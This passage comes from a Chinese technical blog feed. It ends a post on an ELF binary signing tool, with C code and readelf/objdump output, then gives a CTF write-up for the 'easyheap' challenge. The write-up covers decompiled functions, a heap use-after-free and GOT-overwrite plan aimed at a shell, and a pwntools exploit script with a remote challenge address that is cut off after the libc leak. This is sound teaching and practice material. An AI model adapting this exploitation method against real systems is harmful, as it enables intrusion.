<p>  那么我们似乎遇到了一些困惑，<code class="language-plaintext highlighter-rouge">.shstrtab</code> section在ELF文件的中间，万一空间不够添加section name了该怎么办？不如我们将new section name直接添加到文件的末尾，然后修改一下<code class="language-plaintext highlighter-rouge">sh_name</code>不就可以了吗。 似乎想法不错，但是这里需要注意的是，我们要记得修改<code class="language-plaintext highlighter-rouge">.shstrtab</code>的<code class="language-plaintext highlighter-rouge">sh_size</code>,否则还没查到文件末尾就终止了。</p>

<p>修改后的ELF尾应该长这样：</p>

<pre><code class="language-plain">|------------------------|
|  section Header Table  |-----&gt;这里已经插入了new section header
|------------------------|
|  new  section  name    |
|------------------------|
|  section      contain  |
|------------------------|----&gt; end
</code></pre>

<p>这里在给出一个宏观的修改厚的ELF结构图：</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/ELF_struct.jpg" alt="elf struct" /></p>

<p>  插入new section Header难点在计算shstrtab的偏移，首先你需要用:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">offset</span> <span class="o">=</span> <span class="n">filesize</span> <span class="o">-</span> <span class="n">shstrtab</span><span class="p">.</span><span class="n">sh_offset</span>
</code></pre></div></div>

<p>  来获得字符串在<code class="language-plaintext highlighter-rouge">.shstrtab</code>中的偏移，至于怎么获得<code class="language-plaintext highlighter-rouge">shstrtab.sh_offset</code>.你需要先根据ELF Header中的相关字段<code class="language-plaintext highlighter-rouge">e_shstrndx</code>，根据这个偏移找到.shstrtab的section Header，获取对应字段就ok了。这里需要注意要将section header的其他字段设置正确。</p>

<p>  接下来，我们需要修改.shstrtab的sh_size，用filesize - shstrtab.sh_offset就ok了，然后去修改ELF Header里的e_shnum字段，加1即可。最后向文件尾插入对应size的内容就ok了，最后我们看一下程序运行的demo：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  [25] .bss              NOBITS          0000000000004078 003078 000008 00  WA  0   0  1
  [26] .comment          PROGBITS        0000000000000000 003078 000026 01  MS  0   0  1
  [27] .symtab           SYMTAB          0000000000000000 0030a0 0006d8 18     28  45  8
  [28] .strtab           STRTAB          0000000000000000 003778 0002af 00      0   0  1
  [29] .shstrtab         STRTAB          0000000000000000 003a27 0008cf 00      0   0  1
  [30] .sign             NOTE            00000000000042f8 0042f8 000100 00   A  0   0  1
</code></pre></div></div>

<p>可以看到我们成功多加了一个 <code class="language-plaintext highlighter-rouge">.sign</code> section，再来看看文件尾：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mo">000042</span><span class="n">f0</span><span class="o">:</span> <span class="mf">2e73</span> <span class="mi">6967</span> <span class="mf">6e00</span> <span class="mo">0000</span> <span class="mf">24e4</span> <span class="mi">639</span><span class="n">b</span> <span class="mi">5</span><span class="n">a57</span> <span class="mi">60</span><span class="n">ec</span>  <span class="p">.</span><span class="n">sign</span><span class="p">...</span><span class="err">$</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="n">ZW</span><span class="err">`</span><span class="p">.</span>
<span class="mo">00004300</span><span class="o">:</span> <span class="mi">1</span><span class="n">aa4</span> <span class="n">e313</span> <span class="n">cb4d</span> <span class="mi">3</span><span class="n">fb9</span> <span class="mi">9177</span> <span class="mo">053</span><span class="mi">9</span> <span class="mi">2551</span> <span class="n">a21d</span>  <span class="p">.....</span><span class="n">M</span><span class="o">?</span><span class="p">..</span><span class="n">w</span><span class="p">.</span><span class="mi">9</span><span class="o">%</span><span class="n">Q</span><span class="p">..</span>
<span class="p">...</span>
<span class="mo">000043</span><span class="n">f0</span><span class="o">:</span> <span class="n">be18</span> <span class="mi">7</span><span class="n">eb1</span> <span class="mi">25</span><span class="n">af</span> <span class="n">f246</span>                      <span class="p">..</span><span class="o">~</span><span class="p">.</span><span class="o">%</span><span class="p">..</span><span class="n">F</span>
</code></pre></div></div>
<p>确实符合section name + section contain的结构，看来原理是没问题的，经测试可以通过readelf和objdump的检测。</p>

<p>再来用objdump来验证一下看看,也没有什么问题：</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aurora:/home/code/solo/rubbish/ELFsign/build<span class="o">(</span>master○<span class="o">)</span> <span class="c"># objdump -h ls</span>

<span class="nb">ls</span>：     文件格式 elf64-x86-64

节：
Idx Name          Size      VMA               LMA               File off  Algn
  0 .interp       0000001c  00000000000002a8  00000000000002a8  000002a8  2<span class="k">**</span>0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .note.gnu.build-id 00000024  00000000000002c4  00000000000002c4  000002c4  2<span class="k">**</span>2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  2 .note.ABI-tag 00000020  00000000000002e8  00000000000002e8  000002e8  2<span class="k">**</span>2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA

.....

 24 .data         00000268  0000000000022380  0000000000022380  00021380  2<span class="k">**</span>5
                  CONTENTS, ALLOC, LOAD, DATA
 25 .bss          000012d8  0000000000022600  0000000000022600  000215e8  2<span class="k">**</span>5
                  ALLOC
 26 .gnu_debuglink 00000034  0000000000000000  0000000000000000  000215e8  2<span class="k">**</span>2
                  CONTENTS, READONLY
 27 .sign         00000100  0000000000021eb0  0000000000021eb0  00021eb0  2<span class="k">**</span>0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
</code></pre></div></div>

<p>这部分代码实现在<a href="https://github.com/Explainaur/ELFSign/blob/master/src/elf32.c">elf32/elf64.c</a>,32位与64位的原理基本类似，这里不再赘述。</p>

<h3 id="rsa签名及验证模块">RSA签名及验证模块</h3>

<p>  这一部分相对比较简单，只是简单的封装了一下openssl的相关api，然后使用私钥签名，公钥或者X509证书进行验证。</p>

<p>以下代码即位签名的核心函数,具体逻辑请看下面注释，详细的源码在<a href="https://github.com/Explainaur/ELFSign/blob/master/src/sign32.c">sign32.c</a></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bool</span> <span class="nf">SignToELF32</span><span class="p">(</span><span class="n">Elf32</span> <span class="o">*</span><span class="n">elf32</span><span class="p">,</span> <span class="n">RSA</span> <span class="o">*</span><span class="n">pri</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">sign</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

    <span class="cm">/* Get Hash value of load segment */</span>
    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">HashText32</span><span class="p">(</span><span class="n">elf32</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ret</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>

    <span class="cm">/* Add a new section header to Section Header Table */</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">AddSectionHeader32</span><span class="p">(</span><span class="n">elf32</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ret</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>

    <span class="cm">/* Add section name to .shstrtab */</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">AddSectionName32</span><span class="p">(</span><span class="n">elf32</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ret</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>

    <span class="n">GetSign</span><span class="p">(</span><span class="n">elf32</span><span class="o">-&gt;</span><span class="n">digest</span><span class="p">,</span> <span class="n">sign</span><span class="p">,</span> <span class="n">pri</span><span class="p">);</span>

    <span class="cm">/* Write sign to the .sign section */</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">elf32</span><span class="o">-&gt;</span><span class="n">path</span><span class="p">,</span> <span class="s">"ab+"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fd</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">err_msg</span><span class="p">(</span><span class="s">"Can not open file %s"</span><span class="p">,</span> <span class="n">elf32</span><span class="o">-&gt;</span><span class="n">path</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">fwrite</span><span class="p">(</span><span class="n">sign</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">256</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">err_msg</span><span class="p">(</span><span class="s">"Write .text hash failed"</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>这里的签名即验证算法32/64位的程序原理类似，在此不再赘述。</p>

<h2 id="0x04-总结">0x04 总结</h2>

<p>  该项目的实现主要需要熟悉ELF的文件格式，实际上这种新建section的技术被广泛用于软件汉化，因为需要储存中文字符串，所以经常将汉化数据存入so文件的新的section中。我本人勉强算了解逆向工程的相关技术，所以比较熟悉ELF文件的格式。至于内核模块的Hook技术，我之前只尝试过用户态的hook，一般都是使用<code class="language-plaintext highlighter-rouge">ptrace</code>，这次也尝试了一下新的方法，<strong>Kui</strong>的具体原理请见其相关文档。</p>]]></content><author><name>Yvan</name><email>dyf.auroa@gmail.com</email></author><category term="Project" /><summary type="html"><![CDATA[比较有意思原理介绍]]></summary></entry><entry><title type="html">高校战役easyheap</title><link href="http://localhost:4000/blog/easyheap" rel="alternate" type="text/html" title="高校战役easyheap" /><published>2020-04-06T00:00:00+02:00</published><updated>2020-04-06T00:00:00+02:00</updated><id>http://localhost:4000/blog/easyheap</id><content type="html" xml:base="http://localhost:4000/blog/easyheap"><![CDATA[<p>  刷题过少，导致看起来十分简单的题目当时无从下手。没办法，还是要多刷题找手感。今天想起来上次easyheap没整理，趁机学习一波，看了一下思路，果然没什么新的利用点，就是当时漏洞点没发现。</p>

<h3 id="二进制分析">二进制分析</h3>

<hr />

<p>  这个binary只有三个功能：</p>

<ol>
  <li>add_message</li>
  <li>delete_message</li>
  <li>edit_message</li>
</ol>

<p>下面分析一下具体细节：
第一个就是添加一个message结构体，长下面这样:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000000 message         struc ; (sizeof=0x10, mappedto_6)
00000000 content_ptr     dq ?
00000008 size            dd ?
0000000C padding         dd ?
00000010 message         ends
</code></pre></div></div>

<p>然后检查一下size后就会分配nbytes大小的空间，存到content_ptr那里，假如nbytes的大小大于1024的话就会申请失败，但是<code class="language-plaintext highlighter-rouge">ptr[i]</code>却已经分配过了，return之前却没有free掉。所以这里便是漏洞的关键。</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">add_message</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">message</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// rbx</span>
  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h]</span>
  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">nbytes</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]</span>

  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
    <span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Too many items!"</span><span class="p">);</span>
  <span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">message</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10uLL</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"How long is this message?"</span><span class="p">);</span>
  <span class="n">nbytes</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">nbytes</span> <span class="o">&gt;</span> <span class="mi">1024</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Too much size!"</span><span class="p">);</span>
  <span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="n">nbytes</span><span class="p">;</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
  <span class="n">v1</span><span class="o">-&gt;</span><span class="n">content_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">nbytes</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"What is the content of the message?"</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">content_ptr</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">nbytes</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Add successfully."</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>delete就是删除两个chunk，但是size并没有设置为0,又是个漏洞</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">delete_message</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]</span>

  <span class="k">if</span> <span class="p">(</span> <span class="o">++</span><span class="n">delete_count</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Delete failed."</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"What is the index of the item to be deleted?"</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mi">6</span> <span class="o">||</span> <span class="o">!</span><span class="n">ptr</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Delete failed."</span><span class="p">);</span>
  <span class="n">free</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">content_ptr</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>
  <span class="n">ptr</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Delete successfully."</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>edit就是可以重写size个byte的内容到content里</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">edit_message</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]</span>

  <span class="k">if</span> <span class="p">(</span> <span class="o">++</span><span class="n">edit_count</span> <span class="o">&gt;</span> <span class="mi">6</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Delete failed."</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"What is the index of the item to be modified?"</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mi">6</span> <span class="o">||</span> <span class="o">!</span><span class="n">ptr</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Edit failed."</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"What is the content of the message?"</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">content_ptr</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">ptr</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Edit successfully."</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="利用思路">利用思路</h3>

<hr />

<p>其实利用方法上也没有啥新的花样，无非是想办法构造任意写，由于刷题过少导致根本没有思路…</p>
<ol>
  <li>首先分配0x20, 0x80, 0x20三个message</li>
  <li>然后free掉0 1，此时bins构造如下：
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fastbins
0x20: 0x119e050 —▸ 0x119e000 ◂— 0x0
0x30: 0x119e020 ◂— 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x119e070 —▸ 0x7f0a19860b78 (main_arena+88) ◂— 0x119e070
smallbins
empty
largebins
empty
</code></pre></div>    </div>
  </li>
  <li>add一个0x401的message，导致分配失败，此时<code class="language-plaintext highlighter-rouge">ptr[0]</code>中便是<code class="language-plaintext highlighter-rouge">0x119e050</code>，这里比较骚的是<code class="language-plaintext highlighter-rouge">ptr[0]-&gt;content_ptr == 0x119e000</code>，因为<code class="language-plaintext highlighter-rouge">ptr[0]</code>的fd指针仍指向前一个chunk，形成uaf。并且<code class="language-plaintext highlighter-rouge">ptr[0]-&gt;size == 0x80</code></li>
  <li>add一个0x20,此时便有两个指针指向<code class="language-plaintext highlighter-rouge">*ptr[1]</code>,即<code class="language-plaintext highlighter-rouge">ptr[0]-&gt;content_ptr</code>与<code class="language-plaintext highlighter-rouge">ptr[1]</code>,此时我们便可以通过<code class="language-plaintext highlighter-rouge">edit(0)</code>来覆盖<code class="language-plaintext highlighter-rouge">ptr[1]-&gt;content_ptr</code>实现任意写.由于<code class="language-plaintext highlighter-rouge">ptr[0]</code>在高地址，因此顺便可以覆盖<code class="language-plaintext highlighter-rouge">ptr[0]-&gt;content_ptr</code>为puts_got，用于泄漏libc。</li>
  <li>通过任意写将free_got覆盖成puts_plt实现任意读，通过<code class="language-plaintext highlighter-rouge">delete(0)</code>泄露puts_got</li>
  <li>再次edit修改free_got为system，并将<code class="language-plaintext highlighter-rouge">*ptr[2]-&gt;content_ptr</code>写为<code class="language-plaintext highlighter-rouge">/bin/sh\x00</code></li>
  <li>delete(2)实现getshell</li>
</ol>

<p>下面是exp，也算是比较巧的利用了：</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#_*_coding:utf-8_*_
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="n">local</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"debug"</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'split'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>
<span class="k">if</span> <span class="n">local</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./easyheap"</span><span class="p">)</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./easyheap"</span><span class="p">)</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"121.36.209.145"</span><span class="p">,</span><span class="mi">9997</span><span class="p">)</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./easyheap"</span><span class="p">)</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"How long is this message?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"What is the content of the message?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>    
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"What is the index of the item to be deleted?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    
<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"What is the index of the item to be modified?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"What is the content of the message?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>

<span class="n">free_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"free"</span><span class="p">]</span>
<span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1">#0
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1">#1
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1">#2
#gdb.attach(p)
</span><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="c1">#gdb.attach(p)
</span><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"How long is this message?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">1030</span><span class="p">))</span> <span class="c1">#0 *struct 
# gdb.attach(p)
</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span><span class="c1">#1 
#gdb.attach(p)
</span>
<span class="c1">#free_got = 0x602018
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">free_got</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">payload</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="c1">#gdb.attach(p)
</span><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">))</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\x7f</span><span class="s">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="c1">#print hex(puts_addr)
</span><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span><span class="o">-</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>

<span class="c1">#gdb.attach(p)
</span>
